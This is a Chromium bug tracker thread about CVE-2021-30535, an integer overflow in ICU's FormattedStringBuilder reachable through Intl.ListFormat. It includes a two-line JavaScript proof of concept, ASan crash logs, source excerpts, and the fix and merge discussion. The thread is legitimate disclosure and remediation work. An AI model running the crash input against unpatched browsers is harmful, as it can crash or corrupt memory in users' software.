# [v8] Integer overflow leading to OOB/CHECK in icu_71::FormattedStringBuilder::prepareForInsertHelper

| Field | Value |
|-------|-------|
| **Issue ID** | [40059400](https://issues.chromium.org/issues/40059400) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Internationalization |
| **Platforms** | Android, Fuchsia, Linux, Windows, ChromeOS |
| **CVE IDs** | CVE-2021-30535 |
| **Reporter** | pw...@korea.ac.kr |
| **Assignee** | ft...@chromium.org |
| **Created** | 2022-04-17 |
| **Bounty** | $5,000.00 |

## Description

**Steps to reproduce the problem:**

1. I was tested in this version of asan-win32-release\_x64-993200.
2. run: d8.exe poc.js

**Problem Description:**

## Title

- CHECK failed in icu\_71::FormattedStringBuilder::prepareForInsertHelper

## Test environment

- Windows 10 x64
- asan-win32-release\_x64-993200

## ASan Log

AddressSanitizer: CHECK failed: sanitizer\_common.cpp:55 "((0 && "unable to mmap")) != (0)" (0x0, 0x0) (tid=5196)  

==7344==WARNING: Failed to use and restart external symbolizer!  

==7344==\*\*\* WARNING: Failed to initialize DbgHelp! \*\*\*  

==7344==\*\*\* Most likely this means that the app is already \*\*\*  

==7344==\*\*\* using DbgHelp, possibly with incompatible flags. \*\*\*  

==7344==\*\*\* Due to technical reasons, symbolization might crash \*\*\*  

==7344==\*\*\* or produce wrong results. \*\*\*  

#0 0x7ff79cf886b7 in \_\_asan::CheckUnwind C:\b\s\w\ir\cache\builder\src\third\_party\llvm\compiler-rt\lib\asan\asan\_rtl.cpp:70  

#1 0x7ff79cf99d75 in \_\_sanitizer::CheckFailed C:\b\s\w\ir\cache\builder\src\third\_party\llvm\compiler-rt\lib\sanitizer\_common\sanitizer\_termination.cpp:86  

#2 0x7ff79cf8f29e in \_\_sanitizer::ReportMmapFailureAndDie C:\b\s\w\ir\cache\builder\src\third\_party\llvm\compiler-rt\lib\sanitizer\_common\sanitizer\_common.cpp:55  

#3 0x7ff79cf9744b in \_\_sanitizer::MmapOrDieOnFatalError C:\b\s\w\ir\cache\builder\src\third\_party\llvm\compiler-rt\lib\sanitizer\_common\sanitizer\_win.cpp:175  

#4 0x7ff79cf6de98 in \_\_sanitizer::LargeMmapAllocator<\_\_asan::AsanMapUnmapCallback,\_\_sanitizer::LargeMmapAllocatorPtrArrayDynamic,\_\_sanitizer::LocalAddressSpaceView>::Allocate C:\b\s\w\ir\cache\builder\src\third\_party\llvm\compiler-rt\lib\sanitizer\_common\sanitizer\_allocator\_secondary.h:97  

#5 0x7ff79cf6dca2 in \_\_sanitizer::CombinedAllocator<\_\_sanitizer::SizeClassAllocator64<\_\_asan::AP64<\_\_sanitizer::LocalAddressSpaceView> >,\_\_sanitizer::LargeMmapAllocatorPtrArrayDynamic>::Allocate C:\b\s\w\ir\cache\builder\src\third\_party\llvm\compiler-rt\lib\sanitizer\_common\sanitizer\_allocator\_combined.h:71  

#6 0x7ff79cf6a297 in \_\_asan::Allocator::Allocate C:\b\s\w\ir\cache\builder\src\third\_party\llvm\compiler-rt\lib\asan\asan\_allocator.cpp:526  

#7 0x7ff79cf6a059 in \_\_asan::asan\_malloc C:\b\s\w\ir\cache\builder\src\third\_party\llvm\compiler-rt\lib\asan\asan\_allocator.cpp:953  

#8 0x7ff79cf807d0 in malloc C:\b\s\w\ir\cache\builder\src\third\_party\llvm\compiler-rt\lib\asan\asan\_malloc\_win.cpp:99  

#9 0x7ff79d1ba6e7 in icu\_71::FormattedStringBuilder::prepareForInsertHelper C:\b\s\w\ir\cache\builder\src\third\_party\icu\source\i18n\formatted\_string\_builder.cpp:288  

#10 0x7ff79d1b969d in icu\_71::FormattedStringBuilder::insert C:\b\s\w\ir\cache\builder\src\third\_party\icu\source\i18n\formatted\_string\_builder.cpp:183  

#11 0x7ff79d1b95af in icu\_71::FormattedStringBuilder::insert C:\b\s\w\ir\cache\builder\src\third\_party\icu\source\i18n\formatted\_string\_builder.cpp:175  

#12 0x7ff79d025074 in icu\_71::`anonymous namespace'::FormattedListBuilder::append C:\b\s\w\ir\cache\builder\src\third\_party\icu\source\i18n\listformatter.cpp:602  

#13 0x7ff79d02432c in icu\_71::ListFormatter::formatStringsToValue C:\b\s\w\ir\cache\builder\src\third\_party\icu\source\i18n\listformatter.cpp:711  

#14 0x7ff79b2a624e in v8::internal::JSListFormat::FormatList C:\b\s\w\ir\cache\builder\src\v8\src\objects\js-list-format.cc:281  

#15 0x7ff79b95448b in v8::internal::Runtime\_FormatList C:\b\s\w\ir\cache\builder\src\v8\src\runtime\runtime-intl.cc:36  

#16 0x7ff71fecadbb (<unknown module>)

## poc.js

```
  var s = "a".repeat(0xAAAAAAA);  
  print("len: ", new Intl.ListFormat().format(Array(16).fill(s)).length);  

```

**Additional Comments:**

\*\*Chrome version: \*\* 100.0.4896.127 \*\*Channel: \*\* Stable

**OS:** Windows

## Timeline

### pw...@korea.ac.kr (2022-04-18)

[Comment Deleted]

### pw...@korea.ac.kr (2022-04-18)

Update

## Title
  - Heap-Buffer-Overflow in icu_71::FormattedStringBuilder::insert

## Test environment
  - Mac OS
  - asan-mac-release-993256.zip
- Chrome Stable Channel

## Update PoC
```js
var s = "a".repeat(0xFFFFFFE);
print("len: ", new Intl.ListFormat().format(Array(16).fill(s)).length);
```

## ASan
(base) dnslab@dnslabui-iMac ~/D/asan-mac-release-993256> ./d8 test.js 
d8(93143,0x117bb0600) malloc: nano zone abandoned due to inability to preallocate reserved vm space.
=================================================================
==93143==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x0005c00397f8 at pc 0x00010a3320f4 bp 0x7ff7b89bbdc0 sp 0x7ff7b89bbdb8
WRITE of size 2 at 0x0005c00397f8 thread T0
    #0 0x10a3320f3 in icu_71::FormattedStringBuilder::insert(int, icu_71::UnicodeString const&, int, int, icu_71::FormattedStringBuilder::Field, UErrorCode&) formatted_string_builder.cpp:188
    #1 0x10a331aca in icu_71::FormattedStringBuilder::insert(int, icu_71::UnicodeString const&, icu_71::FormattedStringBuilder::Field, UErrorCode&) formatted_string_builder.cpp:175
    #2 0x10a348d12 in icu_71::(anonymous namespace)::FormattedListBuilder::append(icu_71::SimpleFormatter const&, icu_71::UnicodeString const&, int, UErrorCode&) listformatter.cpp:602
    #3 0x10a347f77 in icu_71::ListFormatter::formatStringsToValue(icu_71::UnicodeString const*, int, UErrorCode&) const listformatter.cpp:717
    #4 0x10847b27d in v8::internal::JSListFormat::FormatList(v8::internal::Isolate*, v8::internal::Handle<v8::internal::JSListFormat>, v8::internal::Handle<v8::internal::FixedArray>) js-list-format.cc:281
    #5 0x108acf165 in v8::internal::Runtime_FormatList(int, unsigned long*, v8::internal::Isolate*) runtime-intl.cc:36
    #6 0x10a074677 in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit+0x37 (d8:x86_64+0x102b34677) (BuildId: 4c4c443a55553144a14f089e2214cc7d2400000010000000000b0a0000030c00)
    #7 0x10a101c41 in Builtins_ListFormatPrototypeFormat+0x81 (d8:x86_64+0x102bc1c41) (BuildId: 4c4c443a55553144a14f089e2214cc7d2400000010000000000b0a0000030c00)
    #8 0x109ff60a2 in Builtins_InterpreterEntryTrampoline+0xe2 (d8:x86_64+0x102ab60a2) (BuildId: 4c4c443a55553144a14f089e2214cc7d2400000010000000000b0a0000030c00)
    #9 0x109ff461b in Builtins_JSEntryTrampoline+0x5b (d8:x86_64+0x102ab461b) (BuildId: 4c4c443a55553144a14f089e2214cc7d2400000010000000000b0a0000030c00)
    #10 0x109ff4346 in Builtins_JSEntry+0x86 (d8:x86_64+0x102ab4346) (BuildId: 4c4c443a55553144a14f089e2214cc7d2400000010000000000b0a0000030c00)
    #11 0x107a8ab01 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) execution.cc:425
    #12 0x107a8c316 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::Handle<v8::internal::JSFunction>, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>) execution.cc:534
    #13 0x1075e069c in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) api.cc:2148
    #14 0x10755d813 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::PrintResult, v8::Shell::ReportExceptions, v8::Shell::ProcessMessageQueue) d8.cc:773
    #15 0x10758b2f3 in v8::SourceGroup::Execute(v8::Isolate*) d8.cc:3992
    #16 0x107592769 in v8::Shell::RunMain(v8::Isolate*, bool) d8.cc:4707
    #17 0x1075979b6 in v8::Shell::Main(int, char**) d8.cc:5528
    #18 0x117b3551d in start+0x1cd (dyld:x86_64+0x551d) (BuildId: dd9e80defb3b349b96a446874ad34d1132000000200000000100000000030c00)

0x0005c00397f8 is located 0 bytes to the right of 4294967288-byte region [0x0004c0039800,0x0005c00397f8)
allocated by thread T0 here:
    #0 0x10c725550  (libclang_rt.asan_osx_dynamic.dylib:x86_64+0x47550) (BuildId: 2d8a55079e643bcc85fe4b63b45db9d8240000001000000000070a0000010b00)
    #1 0x10a333560 in icu_71::FormattedStringBuilder::prepareForInsertHelper(int, int, UErrorCode&) formatted_string_builder.cpp:288
    #2 0x10a331d03 in icu_71::FormattedStringBuilder::insert(int, icu_71::UnicodeString const&, int, int, icu_71::FormattedStringBuilder::Field, UErrorCode&) formatted_string_builder.cpp:183
    #3 0x10a331aca in icu_71::FormattedStringBuilder::insert(int, icu_71::UnicodeString const&, icu_71::FormattedStringBuilder::Field, UErrorCode&) formatted_string_builder.cpp:175
    #4 0x10a348d12 in icu_71::(anonymous namespace)::FormattedListBuilder::append(icu_71::SimpleFormatter const&, icu_71::UnicodeString const&, int, UErrorCode&) listformatter.cpp:602
    #5 0x10a347f77 in icu_71::ListFormatter::formatStringsToValue(icu_71::UnicodeString const*, int, UErrorCode&) const listformatter.cpp:717
    #6 0x10847b27d in v8::internal::JSListFormat::FormatList(v8::internal::Isolate*, v8::internal::Handle<v8::internal::JSListFormat>, v8::internal::Handle<v8::internal::FixedArray>) js-list-format.cc:281
    #7 0x108acf165 in v8::internal::Runtime_FormatList(int, unsigned long*, v8::internal::Isolate*) runtime-intl.cc:36
    #8 0x10a074677 in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit+0x37 (d8:x86_64+0x102b34677) (BuildId: 4c4c443a55553144a14f089e2214cc7d2400000010000000000b0a0000030c00)
    #9 0x10a101c41 in Builtins_ListFormatPrototypeFormat+0x81 (d8:x86_64+0x102bc1c41) (BuildId: 4c4c443a55553144a14f089e2214cc7d2400000010000000000b0a0000030c00)
    #10 0x109ff60a2 in Builtins_InterpreterEntryTrampoline+0xe2 (d8:x86_64+0x102ab60a2) (BuildId: 4c4c443a55553144a14f089e2214cc7d2400000010000000000b0a0000030c00)
    #11 0x109ff461b in Builtins_JSEntryTrampoline+0x5b (d8:x86_64+0x102ab461b) (BuildId: 4c4c443a55553144a14f089e2214cc7d2400000010000000000b0a0000030c00)
    #12 0x109ff4346 in Builtins_JSEntry+0x86 (d8:x86_64+0x102ab4346) (BuildId: 4c4c443a55553144a14f089e2214cc7d2400000010000000000b0a0000030c00)
    #13 0x107a8ab01 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) execution.cc:425
    #14 0x107a8c316 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::Handle<v8::internal::JSFunction>, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>) execution.cc:534
    #15 0x1075e069c in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) api.cc:2148
    #16 0x10755d813 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::PrintResult, v8::Shell::ReportExceptions, v8::Shell::ProcessMessageQueue) d8.cc:773
    #17 0x10758b2f3 in v8::SourceGroup::Execute(v8::Isolate*) d8.cc:3992
    #18 0x107592769 in v8::Shell::RunMain(v8::Isolate*, bool) d8.cc:4707
    #19 0x1075979b6 in v8::Shell::Main(int, char**) d8.cc:5528
    #20 0x117b3551d in start+0x1cd (dyld:x86_64+0x551d) (BuildId: dd9e80defb3b349b96a446874ad34d1132000000200000000100000000030c00)

SUMMARY: AddressSanitizer: heap-buffer-overflow formatted_string_builder.cpp:188 in icu_71::FormattedStringBuilder::insert(int, icu_71::UnicodeString const&, int, int, icu_71::FormattedStringBuilder::Field, UErrorCode&)
Shadow bytes around the buggy address:
  0x1000b80072a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x1000b80072b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x1000b80072c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x1000b80072d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x1000b80072e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x1000b80072f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00[fa]
  0x1000b8007300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x1000b8007310: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x1000b8007320: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x1000b8007330: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x1000b8007340: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==93143==ABORTING
Received signal 6

==== C stack trace ===============================

 [0x00010a27235e]
 [0x7ff8137b2dfd]
 [0x7ff7b89bac78]
 [0x7ff8136e8d24]
 [0x00010c74a7a6]
 [0x00010c749f04]
 [0x00010c72d9d7]
 [0x00010c72cc7c]
 [0x00010c72e16b]
 [0x00010a3320f4]
 [0x00010a331acb]
 [0x00010a348d13]
 [0x00010a347f78]
 [0x00010847b27e]
 [0x000108acf166]
 [0x00010a074678]
 [0x00010a101c42]
 [0x000109ff60a3]
[end of stack trace]

### pw...@korea.ac.kr (2022-04-18)

```c++
int32_t FormattedStringBuilder::insert(int32_t index, const UnicodeString &unistr, Field field,
                                    UErrorCode &status) {
    if (unistr.length() == 0) {
        // Nothing to insert.
        return 0;
    } else if (unistr.length() == 1) {
        // Fast path: insert using insertCodePoint.
        return insertCodePoint(index, unistr.charAt(0), field, status);
    } else {
        return insert(index, unistr, 0, unistr.length(), field, status); // [1] FormattedStringBuilder::insert access
    }
}
```

```c++
int32_t
FormattedStringBuilder::insert(int32_t index, const UnicodeString &unistr, int32_t start, int32_t end,
                            Field field, UErrorCode &status) {
    int32_t count = end - start;
    int32_t position = prepareForInsert(index, count, status);
    if (U_FAILURE(status)) {
        return count;
    }
    for (int32_t i = 0; i < count; i++) {
        getCharPtr()[position + i] = unistr.charAt(start + i); // [2] crash point
        getFieldPtr()[position + i] = field;
    }
    return count;
}
```

[1] https://source.chromium.org/chromium/chromium/src/+/main:third_party/icu/source/i18n/formatted_string_builder.cpp;l=175?q=FormattedStringBuilder::insert

[2] https://source.chromium.org/chromium/chromium/src/+/main:third_party/icu/source/i18n/formatted_string_builder.cpp;l=188?q=FormattedStringBuilder::insert

### pw...@korea.ac.kr (2022-04-18)

an integer overflow, leading to a heap-based buffer overflow.
This case is a patch bypass for https://crbug.com/chromium/1150371. Handling of integer size is still not perfect.

### pw...@korea.ac.kr (2022-04-18)

## CREDIT Information
DoHyun Lee (@l33d0hyun) of DNSLab, Korea University

### dt...@chromium.org (2022-04-19)

[Empty comment from Monorail migration]

[Monorail components: Blink>JavaScript>Internationalization]

### [Deleted User] (2022-04-19)

[Empty comment from Monorail migration]

### ts...@chromium.org (2022-04-19)

Assigning per the previous bug (1150371)

### ts...@chromium.org (2022-04-19)

Updating title per C2

### ts...@chromium.org (2022-04-19)

[Empty comment from Monorail migration]

### pw...@korea.ac.kr (2022-04-20)

If you run a test in v8 MacOS version, it is easy to identify the vulnerability.

### pw...@korea.ac.kr (2022-04-20)

[Comment Deleted]

### pw...@korea.ac.kr (2022-04-20)

I would appreciate it if you could check the updated PoC and ASan!

https://bugs.chromium.org/p/chromium/issues/detail?id=1316946#c2

### pw...@korea.ac.kr (2022-04-20)

[Comment Deleted]

### [Deleted User] (2022-04-20)

Setting Pri-1 to match security severity High. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ts...@chromium.org (2022-04-21)

On linux, with GN args including
  dcheck_always_on=true
I get
  TypeError: Internal error. Icu error.
  print("len: ", new Intl.ListFormat().format(Array(16).fill(s)).length);
Let's see what CF thinks.

### cl...@chromium.org (2022-04-21)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5671679753912320.

### ts...@chromium.org (2022-04-21)

[Empty comment from Monorail migration]

### cl...@chromium.org (2022-04-21)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5837937401069568.

### ts...@chromium.org (2022-04-21)

Trying CF again with mac/longer timeout.

### ts...@chromium.org (2022-04-21)

Ah, I missed the update PoC - changing 0xAAAAAAA to 0xFFFFFFE as in C2 repros on linux, even:

==3571729==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7e6f7ffc97f8 at pc 0x55cbb5b9d39f bp 0x7ffc016658e0 sp 0x7ffc016658d8
WRITE of size 2 at 0x7e6f7ffc97f8 thread T0
    #0 0x55cbb5b9d39e in icu_71::FormattedStringBuilder::insert(int, icu_71::UnicodeString const&, int, int, icu_71::FormattedStringBuilder::Field, UErrorCode&) third_party/icu/source/i18n/formatted_string_builder.cpp:188:36
    #1 0x55cbb5b9cb9e in icu_71::FormattedStringBuilder::insert(int, icu_71::UnicodeString const&, icu_71::FormattedStringBuilder::Field, UErrorCode&) third_party/icu/source/i18n/formatted_string_builder.cpp:175:16
    #2 0x55cbb5bb633b in append third_party/icu/source/i18n/formatted_string_builder.h:123:16
    #3 0x55cbb5bb633b in icu_71::(anonymous namespace)::FormattedListBuilder::append(icu_71::SimpleFormatter const&, icu_71::UnicodeString const&, int, UErrorCode&) third_party/icu/source/i18n/listformatter.cpp:602:34
    #4 0x55cbb5bb540d in icu_71::ListFormatter::formatStringsToValue(icu_71::UnicodeString const*, int, UErrorCode&) const third_party/icu/source/i18n/listformatter.cpp:717:16
    #5 0x55cbb38d1035 in FormatListCommon<v8::internal::String> v8/src/objects/js-list-format.cc:230:45
    #6 0x55cbb38d1035 in v8::internal::JSListFormat::FormatList(v8::internal::Isolate*, v8::internal::Handle<v8::internal::JSListFormat>, v8::internal::Handle<v8::internal::FixedArray>) v8/src/objects/js-list-format.cc:281:10
    #7 0x55cbb3fde5b6 in __RT_impl_Runtime_FormatList v8/src/runtime/runtime-intl.cc:41:3
    #8 0x55cbb3fde5b6 in v8::internal::Runtime_FormatList(int, unsigned long*, v8::internal::Isolate*) v8/src/runtime/runtime-intl.c

### ts...@chromium.org (2022-04-21)

Time to try CF for a third time

### cl...@chromium.org (2022-04-21)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6300667530641408.

### ts...@chromium.org (2022-04-21)

Confirmed repros in d8 10.0.139.15, hence found in 100.

### [Deleted User] (2022-04-21)

[Empty comment from Monorail migration]

### [Deleted User] (2022-04-22)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ft...@chromium.org (2022-04-26)

[Empty comment from Monorail migration]

### ft...@chromium.org (2022-04-26)

[Empty comment from Monorail migration]

### ft...@chromium.org (2022-04-26)

report upstream to icu https://unicode-org.atlassian.net/browse/ICU-22005 (in locked security sensitive mode)

### pw...@korea.ac.kr (2022-04-27)

hi,

Can I get a cve id if this vulnerability is patched?

### ft...@chromium.org (2022-04-27)

I can reproduce the problem on my linux local build.  

### ft...@chromium.org (2022-04-28)

Proposed fix in https://github.com/unicode-org/icu/pull/2070

### pw...@korea.ac.kr (2022-04-28)

ping ftang@
Could you please check the C30?

### ft...@chromium.org (2022-04-29)

sorry I have no idea what is "cve id" and how to create one. can any one from the security team help?

### ft...@chromium.org (2022-04-29)

fix in https://chromium-review.googlesource.com/c/chromium/deps/icu/+/3614280 

### pw...@korea.ac.kr (2022-04-29)

ftang@
Please refer to C49 of https://crbug.com/chromium/1194899!
https://bugs.chromium.org/p/chromium/issues/detail?id=1194899#c49 

### gi...@appspot.gserviceaccount.com (2022-04-30)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/deps/icu/+/85814e1af52482199a13d284545623ffbc9eef83

commit 85814e1af52482199a13d284545623ffbc9eef83
Author: Frank Tang <ftang@chromium.org>
Date: Fri Apr 29 23:50:59 2022

CP PR 2070 fix int32 overflow

https://github.com/unicode-org/icu/pull/2070
https://unicode-org.atlassian.net/browse/ICU-22005

Bug: chromium:1316946
Change-Id: I6cd7d687a55b6cc157b1afa52365908be2992fa6
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/deps/icu/+/3614280
Reviewed-by: Jungshik Shin <jshin@chromium.org>

[modify] https://crrev.com/85814e1af52482199a13d284545623ffbc9eef83/source/test/intltest/formatted_string_builder_test.cpp
[add] https://crrev.com/85814e1af52482199a13d284545623ffbc9eef83/patches/formatted_string_builder.patch
[modify] https://crrev.com/85814e1af52482199a13d284545623ffbc9eef83/source/i18n/formatted_string_builder.cpp
[modify] https://crrev.com/85814e1af52482199a13d284545623ffbc9eef83/README.chromium


### ft...@chromium.org (2022-04-30)

sorry, I still do not know how to do that, in C49 of https://crbug.com/chromium/1194899!
amyressler@google.com  adds "Labels: CVE-2021-30535 CVE_description-missing"
but I have no idea what does it mean and what label should I add here.

It is a security bug and the credit for finding it should go to pwnable@korea.ac.kr 
amyressler@google.com- could you point me to the page about the process of "cve id" ?

### gi...@appspot.gserviceaccount.com (2022-04-30)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/761498bd132c3defe0482b752bc2058ce6141d0f

commit 761498bd132c3defe0482b752bc2058ce6141d0f
Author: Frank Tang <ftang@chromium.org>
Date: Sat Apr 30 09:18:25 2022

Roll ICU to fix 3 bugs in ICU 71-1

https://chromium.googlesource.com/chromium/deps/icu.git/+log/5fb93cb4..85814e1a
85814e1 CP PR 2070 fix int32 overflow
a47bd43 CP two ICU security

Bug: chromium:1312557, chromium:1319923, chromium:1316946
Change-Id: Ife54a29972c3811951eb6621ea52ccf36470911f
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3617386
Commit-Queue: Frank Tang <ftang@chromium.org>
Reviewed-by: Jungshik Shin <jshin@chromium.org>
Cr-Commit-Position: refs/heads/main@{#998050}

[modify] https://crrev.com/761498bd132c3defe0482b752bc2058ce6141d0f/DEPS


### am...@chromium.org (2022-04-30)

Hi ftang@ - thanks for fixing this issue and looping me in here; updating as fixed so that the bot will add merge labels and we can get this fix merged into the appropriate release branches. 

OP, re https://crbug.com/chromium/1316946#c36, #36 and all other CVE questions.Thanks for your question. CVEs are issued once the fix is shipped in a stable channel release. The CVE will be directly added to this report at that time. The security team has processes to handle this at the appropriate time, 

### pw...@korea.ac.kr (2022-04-30)

Thanks for your reply! :)

### [Deleted User] (2022-05-02)

This high+ V8 security issue with stable impact requires a lightweight post mortem. Please take some time to answer questions asked in this form [1] to help us improve V8 security. [1] https://docs.google.com/forms/d/e/1FAIpQLSdSMCiEpIFLLFkMbgtulK1sf1B-idQmkFaA4XP2Rz5mN1cqWg/viewform?usp=pp_url&entry.307501673=1316946&entry.364066060=External&entry.958145677=Android&entry.958145677=Chrome&entry.958145677=Fuchsia&entry.958145677=Linux&entry.958145677=Windows&entry.958145677=Lacros&entry.763880440=Extended&entry.1678852700=High&entry.763402679=Blink>JavaScript>Internationalization&entry.975983575=ftang@chromium.org Please ensure to copy the full link, as otherwise some issue meta data might not be populated automatically. 

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-05-02)

[Empty comment from Monorail migration]

### [Deleted User] (2022-05-02)

[Empty comment from Monorail migration]

### [Deleted User] (2022-05-02)

Requesting merge to extended stable M100 because latest trunk commit (998050) appears to be after extended stable branch point (972766).

Requesting merge to stable M101 because latest trunk commit (998050) appears to be after stable branch point (982481).

Requesting merge to beta M102 because latest trunk commit (998050) appears to be after beta branch point (992738).

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-05-02)

Merge review required: a commit with DEPS changes was detected.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: eakpobaro (Android), harrysouders (iOS), ceb (ChromeOS), srinivassista (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-05-02)

Merge review required: a commit with DEPS changes was detected.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: benmason (Android), harrysouders (iOS), matthewjoseph (ChromeOS), pbommana (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-05-02)

Merge review required: a commit with DEPS changes was detected.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), harrysouders (iOS), dgagnon (ChromeOS), srinivassista (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ft...@chromium.org (2022-05-02)

I can verify the d8 on the tip of v8 w/ the rolling that fix the reported issue
but while I try Mac Version 103.0.5038.0 (Official Build) canary (x86_64)
ICU take a longer time to return than the time out so my developer console still disconnect and
my page still dead.  not sure I can call this is as a verify.

### ft...@chromium.org (2022-05-02)

Maybe we should add some code to limit the ListFormat.prototype.format call to throw exception if the total length of text in them is just too long and early throw the exception before calling ICU. 

### ft...@chromium.org (2022-05-02)

[Empty comment from Monorail migration]

### sy...@chromium.org (2022-05-03)

> Maybe we should add some code to limit the ListFormat.prototype.format call to throw exception if the total length of text in them is just too long and early throw the exception before calling ICU.

My take on this is that in JS we generally have two kinds of numeric limits:

1) Implementation resource limits, which are implementation-defined
2) Arbitrary limits built into the spec (like max Array length), which are not implementation-defined

While 2) are almost always informed by implementation, they are still normative requirements imposed on all implementations while 1) are not.

Now it's arguable that 2) is in fact indistinguishable from 1) in practice. Limits in 2) set an upper limit, but implementations are still allowed to throw for values smaller than the upper limit. The practical difference I think is the likelihood of non-interop. Most implementation resource limits are pretty big, like at least INT32_MAX, or INT48_MAX, or whatever. If an implementation were to ship an arbitrary lower upper limit without speccing it, the likelihood of non-interop goes up, since other implementations probably wouldn't impose an arbitrary lower limit.

So in this case I don't think Chrome should ship with a different limit to throw earlier without first normatively changing the spec to require it. It's understandable that tests that test the limit would be very slow. We can deal with that in one of two ways:

A. If the test doesn't time out on release bots, we can choose to only run it on release bots.
B. Otherwise, skip it but commit the test, so at least we have a reference to check against manually.

### ft...@chromium.org (2022-05-03)

1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines

It fix a security issue which crash v8 while int32 overflow causing negative index to buffer access

2. What changes specifically would you like to merge? Please link to Gerrit.
we need to land https://chromium.googlesource.com/chromium/deps/icu.git/+/85814e1af52482199a13d284545623ffbc9eef83 into a icu branch for 101 and 102
and a DEPS change to use that landed commit

3. Have the changes been released and tested on canary?
yes. Verify on d8 which will throw exception after 16 seconds instead of crash after 16 seconds. But cannot verify on Chrome ui or page load because of timeout before the exception thrown.

